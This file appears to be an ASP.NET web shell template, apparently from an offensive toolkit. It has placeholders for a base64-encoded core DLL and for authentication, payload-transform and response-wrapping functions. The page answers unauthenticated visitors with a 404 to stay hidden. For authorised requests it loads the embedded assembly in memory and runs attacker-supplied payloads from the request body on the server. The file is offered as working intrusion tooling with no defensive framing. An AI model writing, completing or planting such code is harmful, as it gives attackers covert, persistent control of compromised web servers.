<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
__EXTRA_IMPORTS__

<script runat="server">
    private const string CoreTypeName = "dotnet_core.NoOneCore";

    private static readonly object CoreLock = new object();
    private static volatile object cachedCore;

    private static readonly string CoreDllBase64 = @"
__CORE_DLL_BASE64__
".Replace("\r", string.Empty).Replace("\n", string.Empty);

    protected void Page_Load(object sender, EventArgs e)
    {
        Response.TrySkipIisCustomErrors = true;

        if (!IsAuthed())
        {
            Response.Clear();
            Response.StatusCode = 404;
            return;
        }

        try
        {
            object noOneCore = GetOrInitCore();
            byte[] rawBody = ReadAllBytes(Request.InputStream);
            byte[] payload = TransformReqPayload(GetArgFromContent(rawBody));

            byte[] result;
            using (MemoryStream output = new MemoryStream())
            {
                noOneCore.Equals(new object[] { payload, output });
                result = output.ToArray();
            }

            byte[] responseBytes = WrapResData(TransformResData(result));

            Response.Clear();
            WrapResponse();
            Response.BinaryWrite(responseBytes);
        }
        catch (Exception ex)
        {
            try
            {
                Response.Clear();
                Response.TrySkipIisCustomErrors = true;
                Response.StatusCode = 200;
                Response.ContentType = "text/plain; charset=utf-8";
                Response.Write(ex.ToString());
            }
            catch { }
        }
    }

    private object GetOrInitCore()
    {
        object core = cachedCore;
        if (core != null)
        {
            return core;
        }

        lock (CoreLock)
        {
            if (cachedCore == null)
            {
                byte[] assemblyBytes = Convert.FromBase64String(CoreDllBase64);
                Assembly assembly = Assembly.Load(assemblyBytes);
                Type coreType = assembly.GetType(CoreTypeName, true);
                cachedCore = Activator.CreateInstance(coreType);
            }

            return cachedCore;
        }
    }

    private static byte[] ReadAllBytes(Stream input)
    {
        using (MemoryStream output = new MemoryStream())
        {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                output.Write(buffer, 0, read);
            }
            return output.ToArray();
        }
    }

__IS_AUTHED__

__GET_ARG_FROM_CONTENT__

__TRANSFORM_REQ_PAYLOAD__

__TRANSFORM_RES_DATA__

__WRAP_RES_DATA__

__WRAP_RESPONSE__

__EXTRA_HELPERS__
</script>
